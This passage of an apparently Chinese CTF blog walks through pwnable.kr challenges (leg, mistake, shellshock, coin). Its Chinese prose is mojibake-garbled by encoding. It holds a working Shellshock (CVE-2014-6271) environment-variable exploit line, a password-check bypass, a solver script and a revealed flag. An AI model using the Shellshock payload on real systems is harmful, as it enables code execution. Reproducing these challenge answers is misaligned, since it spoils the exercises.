string">&lt;fcntl.h></span></span><span class="token keyword">int</span> <span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, pc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span>    <span class="token string">"push    {r6}\n"</span>    <span class="token string">"add    r6, pc, $1\n"</span>    <span class="token string">"bx        r6\n"</span>    <span class="token string">".code    16\n"</span>    <span class="token string">"mov    r3, pc\n"</span>    <span class="token string">"add    r3, $0x4\n"</span>    <span class="token string">"push    {r3}\n"</span>    <span class="token string">"pop    {pc}\n"</span>    <span class="token string">".code    32\n"</span>    <span class="token string">"pop    {r6}\n"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, lr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Daddy has very strong arm! : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratz!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I have strong leg :P\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-armasm"><code class="language-armasm">(gdb) disass mainDump of assembler code for function main:   0x00008d3c <+0>:        push    {r4, r11, lr}   0x00008d40 <+4>:        add        r11, sp, #8   0x00008d44 <+8>:        sub        sp, sp, #12   0x00008d48 <+12>:    mov        r3, #0   0x00008d4c <+16>:    str        r3, [r11, #-16]   0x00008d50 <+20>:    ldr        r0, [pc, #104]    ; 0x8dc0 <main+132>   0x00008d54 <+24>:    bl        0xfb6c <printf>   0x00008d58 <+28>:    sub        r3, r11, #16   0x00008d5c <+32>:    ldr        r0, [pc, #96]    ; 0x8dc4 <main+136>   0x00008d60 <+36>:    mov        r1, r3   0x00008d64 <+40>:    bl        0xfbd8 <__isoc99_scanf>   0x00008d68 <+44>:    bl        0x8cd4 <key1>   0x00008d6c <+48>:    mov        r4, r0   0x00008d70 <+52>:    bl        0x8cf0 <key2>   0x00008d74 <+56>:    mov        r3, r0   0x00008d78 <+60>:    add        r4, r4, r3   0x00008d7c <+64>:    bl        0x8d20 <key3>   0x00008d80 <+68>:    mov        r3, r0   0x00008d84 <+72>:    add        r2, r4, r3   0x00008d88 <+76>:    ldr        r3, [r11, #-16]   0x00008d8c <+80>:    cmp        r2, r3   0x00008d90 <+84>:    bne        0x8da8 <main+108>   0x00008d94 <+88>:    ldr        r0, [pc, #44]    ; 0x8dc8 <main+140>   0x00008d98 <+92>:    bl        0x1050c <puts>   0x00008d9c <+96>:    ldr        r0, [pc, #40]    ; 0x8dcc <main+144>   0x00008da0 <+100>:    bl        0xf89c <system>   0x00008da4 <+104>:    b        0x8db0 <main+116>   0x00008da8 <+108>:    ldr        r0, [pc, #32]    ; 0x8dd0 <main+148>   0x00008dac <+112>:    bl        0x1050c <puts>   0x00008db0 <+116>:    mov        r3, #0   0x00008db4 <+120>:    mov        r0, r3   0x00008db8 <+124>:    sub        sp, r11, #8   0x00008dbc <+128>:    pop        {r4, r11, pc}   0x00008dc0 <+132>:    andeq    r10, r6, r12, lsl #9   0x00008dc4 <+136>:    andeq    r10, r6, r12, lsr #9   0x00008dc8 <+140>:                ; <UNDEFINED> instruction: 0x0006a4b0   0x00008dcc <+144>:                ; <UNDEFINED> instruction: 0x0006a4bc   0x00008dd0 <+148>:    andeq    r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1:   0x00008cd4 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008cd8 <+4>:        add        r11, sp, #0   0x00008cdc <+8>:        mov        r3, pc   0x00008ce0 <+12>:    mov        r0, r3   0x00008ce4 <+16>:    sub        sp, r11, #0   0x00008ce8 <+20>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008cec <+24>:    bx        lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2:   0x00008cf0 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008cf4 <+4>:        add        r11, sp, #0   0x00008cf8 <+8>:        push    {r6}        ; (str r6, [sp, #-4]!)   0x00008cfc <+12>:    add        r6, pc, #1   0x00008d00 <+16>:    bx        r6   0x00008d04 <+20>:    mov        r3, pc   0x00008d06 <+22>:    adds    r3, #4   0x00008d08 <+24>:    push    {r3}   0x00008d0a <+26>:    pop        {pc}   0x00008d0c <+28>:    pop        {r6}        ; (ldr r6, [sp], #4)   0x00008d10 <+32>:    mov        r0, r3   0x00008d14 <+36>:    sub        sp, r11, #0   0x00008d18 <+40>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008d1c <+44>:    bx        lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3:   0x00008d20 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008d24 <+4>:        add        r11, sp, #0   0x00008d28 <+8>:        mov        r3, lr   0x00008d2c <+12>:    mov        r0, r3   0x00008d30 <+16>:    sub        sp, r11, #0   0x00008d34 <+20>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008d38 <+24>:    bx        lrEnd of assembler dump.(gdb) </code></pre><h3 id="ÂàÜÊûê-7"><a href="#ÂàÜÊûê-7" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>ÈÄöËøá c Êñá‰ª∂ÁúãÔºåÂ∞±ÊòØÊâæÂà∞ key1„ÄÅkey2„ÄÅkey3 ‰πãÂíåÂç≥ÂèØ</p><ul><li><p>key1Ôºö</p><ul><li>ÂΩìÂ§ÑÁêÜÂô®Â§Ñ‰∫éARMÁä∂ÊÄÅÊó∂ÔºåÊØèÊù°ARMÊåá‰ª§‰∏∫4‰∏™Â≠óËäÇÔºåÊâÄ‰ª•PCÂØÑÂ≠òÂô®ÁöÑÂÄº‰∏∫ÂΩìÂâçÊåá‰ª§Âú∞ÂùÄ + 8Â≠óËäÇ</li><li>ÂΩìÂ§ÑÁêÜÂô®Â§Ñ‰∫éThumbÁä∂ÊÄÅÊó∂ÔºåÊØèÊù°ThumbÊåá‰ª§‰∏∫2Â≠óËäÇÔºåÊâÄ‰ª•PCÂØÑÂ≠òÂô®ÁöÑÂÄº‰∏∫ÂΩìÂâçÊåá‰ª§Âú∞ÂùÄ + 4Â≠óËäÇ</li></ul><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15910787471583.jpg" alt="https://static.docs.arm.com/ihi0042/g/aapcs32.pdf"></p><p>ÂΩìÂè™Êúâ‰∏Ä‰∏™ÁªìÊûúËøîÂõûÊó∂Ôºå‰ºöÊîæÂú® r0 ÈáåÔºåÊâÄ‰ª• key1Ôºö0x00008cdc + 0x8 = 0x00008ce4</p></li><li><p>key2Ôºö<br>Áî±‰∫é 0x00008cfc Â§Ñ r6Ôºö0x1 + 0x00008cfc + 0x8 = 0x00008d05 ÊúÄÂêé‰∏Ä‰Ωç‰∏∫ 1 ÂØºËá¥Âú®0x00008d00Â§ÑËøõÂÖ• Thumb Áä∂ÊÄÅÔºå‰∫éÊòØ 0x00008d06 Â§Ñ r3 = 0x00008d04 + 0x4 + 0x4 = 0x00008d0c</p></li><li><p>key3Ôºö</p><p>ËøûÊé•ÂØÑÂ≠òÂô®r14ÔºàLRÔºâÔºöÊØèÁßçÊ®°Âºè‰∏ãr14ÈÉΩÊúâËá™Ë∫´ÁâàÁªÑÔºåÂÆÉÊúâ‰∏§‰∏™ÁâπÊÆäÂäüËÉΩÔºö</p><ol><li>‰øùÂ≠òÂ≠êÁ®ãÂ∫èËøîÂõûÂú∞ÂùÄ„ÄÇ‰ΩøÁî®BLÊàñBLXÊó∂ÔºåË∑≥ËΩ¨Êåá‰ª§Ëá™Âä®ÊääËøîÂõûÂú∞ÂùÄÊîæÂÖ•r14‰∏≠ÔºõÂ≠êÁ®ãÂ∫èÈÄöËøáÊäär14Â§çÂà∂Âà∞PCÊù•ÂÆûÁé∞ËøîÂõû</li><li>ÂΩìÂºÇÂ∏∏ÂèëÁîüÊó∂ÔºåÂºÇÂ∏∏Ê®°ÂºèÁöÑr14Áî®Êù•‰øùÂ≠òÂºÇÂ∏∏ËøîÂõûÂú∞ÂùÄÔºåÂ∞Ür14Â¶ÇÊ†àÂèØ‰ª•Â§ÑÁêÜÂµåÂ•ó‰∏≠Êñ≠</li></ol><p>ÂèØ‰ª•ÁúãÂà∞‰∏ã‰∏ÄÊù°Êåá‰ª§ÁöÑÂú∞ÂùÄ‰∏∫ 0x00008d80</p><p>ÊâÄ‰ª• key3Ôºö0x00008d80</p></li></ul><p>ÁªºÂêàËÆ°ÁÆó key1 + key2 + key3 = 0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400</p><h3 id="Ëß£È¢ò-7"><a href="#Ëß£È¢ò-7" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">/ $ ./legDaddy has very strong arm! : 108400Congratz!My daddy has a lot of ARMv5te muscle!</code></pre><h2 id="9-mistake"><a href="#9-mistake" class="headerlink" title="9. mistake"></a>9. mistake</h2><h3 id="È¢òÁõÆ-8"><a href="#È¢òÁõÆ-8" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> PW_LEN 10</span><span class="token macro property">#<span class="token directive keyword">define</span> XORKEY 1</span><span class="token keyword">void</span> <span class="token function">xor</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> XORKEY<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/home/mistake/password"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">,</span><span class="token number">0400</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"can't open password %d\n"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"do not bruteforce...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> pw_buf<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>pw_buf<span class="token punctuation">,</span>PW_LEN<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token keyword">char</span> pw_buf2<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input password : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%10s"</span><span class="token punctuation">,</span> pw_buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// xor your input</span>    <span class="token function">xor</span><span class="token punctuation">(</span>pw_buf2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>pw_buf<span class="token punctuation">,</span> pw_buf2<span class="token punctuation">,</span> PW_LEN<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password OK\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Password\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-8"><a href="#ÂàÜÊûê-8" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>È¢òÁõÆÁªô‰∫ÜÊèêÁ§∫</p><p>hint : operator priority</p><p>ÁÑ∂ÂêéÊ≥®ÊÑèÂà∞ËøôÂè•<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>ËøôÈáåÈù¢ÁöÑÊâßË°å‰ºòÂÖàÁ∫ßÊòØÊúâÈóÆÈ¢òÁöÑÔºåÂ∫îËØ•‰∏∫<code>if((fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400)) &lt; 0)</code>ÔºåÈîôËØØÁöÑÂÜôÊ≥ïÂØºËá¥ fd=0ÔºåÁ¥ßË∑üÁùÄ read Âàô‰ºö‰ªé stdinÈáåÈù¢ËØªÂèñ 10 ‰ΩçÈïøÂ∫¶ÂÜÖÂÆπ‰Ωú‰∏∫ password</p><p>ÊâÄ‰ª•ÊúÄÁªà pw_buf Âíå pw_buf2 Êàë‰ª¨ÈÉΩËÉΩÊéßÂà∂ÔºåÂè™Ë¶Å‰øùËØÅÊØè‰∏Ä‰ΩçÂíå 1 ËøõË°å‰∫¶ÊàñÂç≥ÂèØ</p><h3 id="Ëß£È¢ò-8"><a href="#Ëß£È¢ò-8" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">mistake@pwnable:~$ ./mistake do not bruteforce...0000000000input password : 1111111111Password OKMommy, the operator priority always confuses me :(</code></pre><h2 id="10-shellshock"><a href="#10-shellshock" class="headerlink" title="10. shellshock"></a>10. shellshock</h2><h3 id="È¢òÁõÆ-9"><a href="#È¢òÁõÆ-9" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setresgid</span><span class="token punctuation">(</span><span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/home/shellshock/bash -c 'echo shock_me'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-9"><a href="#ÂàÜÊûê-9" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Á†¥Â£≥ÊºèÊ¥ûÁöÑÂà©Áî®Ôºå<a href="https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">ËøôÁØáÊñáÁ´†</a>Â•ΩÁÇπ</p><p>Êü•ÁúãÊúâÊºèÊ¥ûÁöÑ bash ÁâàÊú¨</p><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ ./bash --versionGNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)</code></pre><p>ÂêåÊó∂Ê≥®ÊÑèÂà∞Êñá‰ª∂ÊùÉÈôê</p><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ ls -sailtotal 98023593359   4 drwxr-x---   5 root shellshock       4096 Oct 23  2016 .23593232   4 drwxr-xr-x 116 root root             4096 Apr 17 14:10 ..23593368 940 -r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash23593367   4 d---------   2 root root             4096 Oct 12  2014 .bash_history23593366   4 -r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag23593364   4 dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi23593361   4 drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache23593363  12 -r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock23593360   4 -r--r--r--   1 root root              188 Oct 12  2014 shellshock.c</code></pre><h3 id="Ëß£È¢ò-9"><a href="#Ëß£È¢ò-9" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ env x='() { :;}; /home/shellshock/bash -c "cat /home/shellshock/flag"' ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault (core dumped)</code></pre><h2 id="11-coin"><a href="#11-coin" class="headerlink" title="11. coin"></a>11. coin</h2><h3 id="È¢òÁõÆ-10"><a href="#È¢òÁõÆ-10" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-shell"><code class="language-shell">    ---------------------------------------------------    -              Shall we play a game?              -    ---------------------------------------------------    You have given some gold coins in your hand    however, there is one counterfeit coin among them    counterfeit coin looks exactly same as real coin    however, its weight is different from real one    real coin weighs 10, counterfeit coin weighes 9    help me to find the counterfeit coin with a scale    if you find 100 counterfeit coins, you will get reward :)    FYI, you have 60 seconds.    - How to play -     1. you get a number of coins (N) and number of chances (C)    2. then you specify a set of index numbers of coins to be weighed    3. you get the weight information    4. 2~3 repeats C time, then you give the answer    - Example -    [Server] N=4 C=2     # find counterfeit among 4 coins with 2 trial    [Client] 0 1         # weigh first and second coin    [Server] 20            # scale result : 20    [Client] 3            # weigh fourth coin    [Server] 10            # scale result : 10    [Client] 2             # counterfeit coin is third!    [Server] Correct!    - Ready? starting in 3 sec... -</code></pre><h3 id="ÂàÜÊûê-10"><a href="#ÂàÜÊûê-10" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>‰∫åÂàÜÊ≥ïÊâæ coin</p><h3 id="Ëß£È¢ò-10"><a href="#Ëß£È¢ò-10" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><p>ËøúÁ®ãË∑ëÂÆπÊòìÂèóÂà∞ÁΩëÁªúÂΩ±ÂìçÔºåÊé®ËçêÈÉ®ÁΩ≤Âà∞<code>/tmp/</code>ÈáåÊú¨Âú∞Ë∑ëÔºåÈùûÂ∏∏Âø´</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> re <span class="token keyword">import</span> compileconn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9007</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getList</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>int<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    status <span class="token operator">=</span> <span class="token boolean">False</span>    data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;-] recv: %s"</span> <span class="token operator">%</span> data<span class="token punctuation">)</span>    NC <span class="token operator">=</span> compile<span class="token punctuation">(</span><span class="token string">"^N=([0-9]*) C=([0-9]*)$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    W <span class="token operator">=</span> compile<span class="token punctuation">(</span><span class="token string">"^([0-9]*)$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> NC<span class="token punctuation">:</span>        end <span class="token operator">=</span> int<span class="token punctuation">(</span>NC<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        fp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> end<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>        sp <span class="token operator">=</span> <span class="token punctuation">(</span>end<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span>         status <span class="token operator">=</span> <span class="token boolean">True</span>      <span class="token keyword">elif</span> W<span class="token punctuation">:</span>        <span class="token keyword">if</span> int<span class="token punctuation">(</span>W<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">:</span>            fp <span class="token operator">=</span> sp        tp <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span>        sp <span class="token operator">=</span> <span class="token punctuation">(</span>tp<span class="token punctuation">,</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        fp <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tp<span class="token punctuation">)</span>        status <span class="token operator">=</span> <span class="token boolean">True</span>     <span class="token keyword">elif</span> <span class="token string">"format error"</span> <span class="token keyword">in</span> data <span class="token operator">or</span> <span class="token string">"time expired"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>.&lt; Bye..."</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">if</span> status<span class="token punctuation">:</span>        data <span class="token operator">=</span> getList<span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[->] send: %s"</span> <span class="token operator">%</span> data<span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span></code></pre><pre class=" language-shell"><code class="language-shell">[<-] recv: Congrats! get your flagb1NaRy_S34rch1nG_1s_3asy_p3asy</code></pre><h2 id="12-blackjeck"><a href="#12-blackjeck" class="headerlink" title="12. blackjeck"></a>12. blackjeck</h2><h3 id="È¢òÁõÆ-11"><a href="#È¢òÁõÆ-11" class="headerlink" 